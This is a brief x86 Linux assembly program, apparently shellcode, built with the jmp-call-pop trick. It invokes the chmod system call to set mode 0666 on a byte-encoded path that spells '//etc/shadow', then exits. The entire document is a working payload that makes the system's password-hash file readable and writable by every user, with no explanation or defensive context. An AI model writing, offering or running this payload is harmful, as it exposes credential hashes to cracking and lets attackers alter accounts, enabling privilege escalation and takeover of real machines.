section .text
        global _start
 
_start:
jmp shellcode
code:
pop ebx
xor eax,eax
mov al, 15
mov cx, 0666o
int 0x80
xor ebx,ebx
mov al, 1
int 0x80
shellcode:
call code
var db 0x2f,0x2f,0x65,0x74,0x63,0x2f,0x73,0x68,0x61,0x64,0x6f,0x77
